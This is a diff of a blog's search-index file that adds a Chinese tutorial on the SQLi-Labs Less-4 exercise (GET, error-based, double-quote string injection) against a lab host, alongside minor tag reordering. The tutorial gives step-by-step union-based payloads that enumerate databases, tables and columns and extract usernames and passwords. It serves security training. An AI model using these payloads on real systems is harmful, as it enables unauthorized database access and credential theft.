@@ -4,6 +4,19 @@
   
     
     <entry>
+      <title>SQL注入之GET-ErrorBased-DoubleQuotes-String</title>
+      <link href="/2020/10/18/sql-zhu-ru-zhi-get-errorbased-doublequotes-string/"/>
+      <url>/2020/10/18/sql-zhu-ru-zhi-get-errorbased-doublequotes-string/</url>
+      
+        <content type="html"><![CDATA[<h1 id="0x01-SQL注入"><a href="#0x01-SQL注入" class="headerlink" title="0x01 SQL注入"></a>0x01 SQL注入</h1><p>&emsp;&emsp;<strong>SQL注入</strong>就是指Web应用程序对数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且将参数直接拼接成SQL语句带入数据库进行相关操作，攻击者可以通过构造不同的SQL语句来    实现对数据库的任意操作。</p><p>&emsp;&emsp;SQL注入<strong>按参数的数字类型</strong>可分为：<code>数字型(Integer)</code>、<code>字符型(String)</code>；<strong>按返回结果</strong>可分为：<code>显错注入(Error-Based)</code>、<code>基于布尔的盲注(Boolean-Based Blind)</code>、<code>基于时间的盲注(Time-Based Blind)</code>；<strong>按HTTP请求类型</strong>可分为：<code>GET型注入(GET)</code>、<code>POST型注入(POST)</code>。本文测试的注入类型为：GET型、显错型、字符型注入。</p><h1 id="0x02-实验环境"><a href="#0x02-实验环境" class="headerlink" title="0x02 实验环境"></a>0x02 实验环境</h1><ul><li>服务器系统：<code>Windows Server 2008</code></li><li>中间件：<code>IIS</code></li><li>数据库：<code>MySQL</code></li><li>客户机：<code>Windows 10</code></li><li>靶机：<code>SQLi-Labs</code></li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/实验界面.png" alt="实验界面"></center><h1 id="0x03-实验工具"><a href="#0x03-实验工具" class="headerlink" title="0x03 实验工具"></a>0x03 实验工具</h1><ul><li><code>FireFox</code></li><li><code>HackBar</code></li></ul><h1 id="0x04-注入步骤"><a href="#0x04-注入步骤" class="headerlink" title="0x04 注入步骤"></a>0x04 注入步骤</h1><ol><li><strong>注入点判断</strong>。判断测试点是否存在SQL注入漏洞。</li><li><strong>注入类型判断</strong>。主要是判断注入点位置使用的SQL语句格式，若单引号未被过滤或转义，且回显报错信息，则使用单引号可以快速判断出注入类型。</li><li><strong>判断SQL语句中的列数</strong>。注入点正常显示的数据往往不是我们想要得到的数据，通常我们需要使用<code>union</code>或<code>报错</code>等操作，使得此注入点显示的数据是我们想要得到的，但构造我们需要的查询时必须要知道此位置的SQL语句中的列数，否则SQL执行时会发生错误。</li><li><strong>判断SQL语句操作的回显</strong>。判断SQL回显主要是通过对比来判断。使用<code>union</code>查询时我们需要找一个在前端显示的点，让我们查询到的数据显示出来；使用报错注入时也需要在前端显示我们想要得到的数据，所以需要先找到类似的回显，报错注入可以根据对比不同payload操作结果的对比来判断。但当该位置不存在回显信息或回显的错误信息被屏蔽时，我们可以采用对比响应的时候来判断回显，基于时间的盲注即采取这种方式。</li><li><strong>构造SQL注入获取数据库指纹等</strong>。在爆数据库内部信息时，需要先得到<code>数据库用户名</code>、<code>版本</code>、<code>数据库名称</code>等消息，这会对我们的后续注入有很大的帮助。例如：MySQL数据库5.0版本之后和之前的注入操作会有些许差别，另外数据库信息对我们查找对应的<code>1day</code>有很大的帮助。</li><li><strong>构造SQL语句爆数据表名</strong>。对数据库进行爆破的最终目的是爆数据库字段值，但在爆字段值之前我们需要知道相对应的字段名和表名，因此开始正式爆破时，需要先得到数据库的表名信息。</li><li><strong>构造SQL语句爆字段名</strong>。在拿到数据库表名信息后，需要继续爆破表中的字段值，以判断哪些字段是我们想要得到的。</li><li><strong>构造SQL语句爆字段值</strong>。爆破的最终目的就是爆表中的字段值，再得到表名、字段名后就需要尝试爆我们想要得到的字段值。</li></ol><h1 id="0x05-实验步骤"><a href="#0x05-实验步骤" class="headerlink" title="0x05 实验步骤"></a>0x05 实验步骤</h1><ol><li><p>按照页面提示信息在地址栏中访问<code>http://10.10.10.148:86/Less-4/index.php?id=1</code>，结果展示如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/正常访问结果显示.png" alt="正常访问结果显示"></center></li><li><p>使用单引号测试SQL语句类型。在浏览器地址栏中输入:<code>10.10.10.148:86/Less-4/index.php?id=1&#39;</code>，访问结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/单引号测试结果.png" alt="单引号测试结果"></center></li><li><p>由上图中的信息无法判断出单引号是被过滤还是被转义或者忽略，因此在浏览器地址栏中输入：<code>http://10.10.10.148:86/Less-4/index.php?id=1&quot;</code>进行双引号测试，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/双引号测试结果.png" alt="双引号测试结果"></center></li><li><p>由上图中的报错信息可以推测出SQL语句大致为：<code>select * from users where id=(&quot;参数&quot;) limit 0，1;</code>，<font color="red">参数为<code>String</code>型而且SQL语句中使用双引号(<code>&quot;</code>)和圆括号界定该参数</font>。因此，我们可以构造的恒真语句为：</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span><span class="token string">") or ("</span><span class="token number">1</span><span class="token string">")=("</span><span class="token number">1</span><span class="token number">1</span>"<span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment" spellcheck="true">--+</span></code></pre><p>其中<code>1&quot;) or (&quot;1&quot;)=(&quot;1</code>payload的操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/or恒真测试.png" alt="payload恒真测试"/"></center></li><li><p>使用<code>order by</code>语句来获取SQL查询结果的列数。使用如下payload的执行结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>"<span class="token punctuation">)</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span><span class="token comment" spellcheck="true">--+</span>?id<span class="token operator">=</span><span class="token number">1</span>"<span class="token punctuation">)</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">2</span><span class="token comment" spellcheck="true">--+</span>?id<span class="token operator">=</span><span class="token number">1</span>"<span class="token punctuation">)</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span><span class="token comment" spellcheck="true">--+</span>?id<span class="token operator">=</span><span class="token number">1</span>"<span class="token punctuation">)</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">4</span><span class="token comment" spellcheck="true">--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/order by 1操作结果.png" alt="order by 1操作结果"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/order by 2操作结果.png" alt="order by 2操作结果"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/order by 3操作结果.png" alt="order by 3操作结果"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/order by 4操作结果.png" alt="order by 4操作结果"></center></li><li><p>由上述操作结果表明，该位置的SQL语句查询结果为3列。因此我们使用如下所示的payload来判断该注入点的回显位置，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-4/index.php?id=-1") union select 1,2,3--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/union select语句判断SQL回显位置.png" alt="union select语句判断SQL回显位置"></center><p>注：</p><ul><li>使用<code>union</code>进行联合查询是想要查询的数据回显，则需要第一个查询结果为空。</li></ul></li><li><p>使用<code>user()、database()、version()</code>函数等获取当前数据库的信息，payload如下所示，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">-- 获取当前用户信息</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-4/index.php?id=-1") union select 1,user(),3--+</span><span class="token comment" spellcheck="true">-- 获取当前数据库名称</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-4/index.php?id=-1") union select 1,database(),3--+</span><span class="token comment" spellcheck="true">-- 获取当前数据库版本信息</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-4/index.php?id=-1") union select 1,version(),3--+</span><span class="token comment" spellcheck="true">-- 获取数据库的路径信息</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-4/index.php?id=-1") union select 1,@@datadir,3--+</span><span class="token comment" spellcheck="true">-- 获取当前系统的版本信息</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-4/index.php?id=-1") union select 1,@@version_compile_os,3--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/获取数据库用户信息.png" alt="获取数据库用户信息"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/获取当前数据库名称.png" alt="获取当前数据库名称"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/获取数据库版本信息.png" alt="获取数据库版本信息"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/获取当前数据库所在路径.png" alt="获取当前数据库所在路径"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/获取服务器版本信息.png" alt="获取服务器版本信息"></center></li><li><p>由上述操作得知MySQL的版本为：<code>5.1.73</code>，因此数据库中存在<code>information_schema</code>数据库，因此可以使用如下payload爆MySQL中所有数据库名称，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-4/index.php?id=-1") union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/爆出所有数据库名称.png" alt="爆出所有数据库名称"></center></li><li><p>在得到数据库名称后，可以继续爆数据库中的数据表，使用如下所示的payload可以爆出<code>security</code>数据库中所有的数据表名称，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-4/index.php?id=-1") union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/爆出security数据库的所有表名.png" alt="爆出security数据库的所有表名"></center></li><li><p>在得到数据表名称后，可以继续爆数据表中的字段信息，使用如下所示的payload可以爆出<code>users</code>表中所有的列名，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-4/index.php?id=-1") union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/爆出users表的所有列名.png" alt="爆出users表的所有列名"></center></li><li><p>在得到数据库名称、数据表名称、数据列名称后，可以继续爆数据表中的字段值，使用如下所示的payload可以爆出id为2的用户名和密码，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-4/index.php?id=-1") union select 1,username,password from users where id=2--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/爆字段值.png" alt="爆字段值"></center></li></ol><h1 id="0x06-实验分析"><a href="#0x06-实验分析" class="headerlink" title="0x06 实验分析"></a>0x06 实验分析</h1><p>&emsp;&emsp;此实验模拟的一个具有错误回显的字符型注入。最终的操作是得到一组用户名及其密码。</p><ul><li>HTTP请求为：<code>GET</code></li><li>参数格式为：<code>select * from users where id=(&quot;参数&quot;);</code></li><li>未进行转义、过滤等</li><li>可使用双引号判断注入类型</li></ul><h1 id="0x07-参考链接"><a href="#0x07-参考链接" class="headerlink" title="0x07 参考链接"></a>0x07 参考链接</h1><ul><li><p><a href="https://z1r0s.github.io/2020/09/29/mysql-zhu-ru-chang-yong-han-shu/">MySQL注入常用函数</a></p></li><li><p><a href="https://z1r0s.github.io/2020/09/07/sql-zhu-ru-bi-ji/">MySQL注入笔记</a></p></li></ul>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>SQL注入之GET-ErrorBasd-SingleQuotesWithTwist-String</title>
       <link href="/2020/10/17/sql-zhu-ru-zhi-get-errorbasd-singlequoteswithtwist-string/"/>
       <url>/2020/10/17/sql-zhu-ru-zhi-get-errorbasd-singlequoteswithtwist-string/</url>
@@ -20,9 +33,9 @@
       
         <tags>
             
-            <tag> MySQL </tag>
-            
             <tag> SQLi </tag>
+            
+            <tag> MySQL </tag>
             
         </tags>
       
@@ -47,9 +60,9 @@
       
         <tags>
             
-            <tag> MySQL </tag>
-            
             <tag> SQLi </tag>
+            
+            <tag> MySQL </tag>
             
         </tags>
       
@@ -74,9 +87,9 @@
       
         <tags>
             
-            <tag> MySQL </tag>
-            
             <tag> SQLi </tag>
+            
+            <tag> MySQL </tag>
             
         </tags>
       
@@ -153,9 +166,9 @@
       
         <tags>
             
-            <tag> MySQL </tag>
-            
             <tag> SQLi </tag>
+            
+            <tag> MySQL </tag>
             
         </tags>
       
@@ -473,9 +486,9 @@
       
         <tags>
             
-            <tag> 环境搭建 </tag>
-            
             <tag> Windows </tag>
+            
+            <tag> 环境搭建 </tag>
             
         </tags>
       
@@ -1195,11 +1208,11 @@
       
         <tags>
             
+            <tag> 网络基础 </tag>
+            
             <tag> RSTP </tag>
             
             <tag> 网络协议 </tag>
-            
-            <tag> 网络基础 </tag>
             
         </tags>
       
